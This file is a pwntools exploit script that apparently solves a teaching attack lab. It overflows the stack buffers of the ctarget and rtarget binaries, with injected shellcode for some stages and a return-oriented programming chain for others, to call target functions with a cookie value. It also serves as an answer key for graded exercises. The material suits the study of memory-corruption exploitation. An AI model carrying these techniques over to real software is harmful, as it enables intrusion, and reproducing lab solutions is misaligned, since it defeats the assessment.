from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

cookie = 0x59b997fa
# # Part I
# r = process(["./ctarget","-q"])

# # level 1
# touch1 = 0x4017C0
# payload = 'a'*0x28 + p64(touch1)
# r.recv()
# r.sendline(payload)

# # level 2
# touch2 = 0x4017EC
# buf = 0x5561dc78
# shellcode = '''
# 	push %d
# 	mov rdi,%d
# 	ret
# '''%(touch2,cookie)
# payload = asm(shellcode).ljust(0x28,'a') + p64(buf)
# r.sendline(payload)

# # level 3
# touch3 = 0x4018FA
# buf = 0x5561dc78
# sval = 0x604200
# cookie_val = 0x3539423939374641
# shellcode = '''
# 	push %d
# 	mov rdi,%d
# 	mov DWORD ptr [rdi], %d
# 	mov DWORD ptr [rdi+4], %d
# 	ret
# '''%(touch3,sval,0x39623935,0x61663739)
# payload = asm(shellcode).ljust(0x28,'a') + p64(buf)
# r.sendline(payload)

# Part II
r = process(["./rtarget","-q"])

# # level 2
# touch2 = 0x4017EC
# pop_rdi_ret = 0x40141b
# payload = 'a'*0x28 + p64(pop_rdi_ret) + p64(cookie) + p64(touch2)
# r.sendline(payload)

# level 3
touch3 = 0x4018FA
sval = 0x605200
pop_rdi_ret = 0x40141b
mov_ptr_rdi = 0x40214e # mov dword ptr [rdi + 8], eax ; ret
pop_rax_ret = 0x4019ab
payload = 'a'*0x28
payload += p64(pop_rdi_ret) + p64(sval-8)
payload += p64(pop_rax_ret) + p64(0x39623935)
payload += p64(mov_ptr_rdi)
payload += p64(pop_rdi_ret) + p64(sval-4)
payload += p64(pop_rax_ret) + p64(0x61663739)
payload += p64(mov_ptr_rdi)
payload += p64(pop_rdi_ret) + p64(sval)
payload += p64(touch3)
r.sendline(payload)

r.interactive()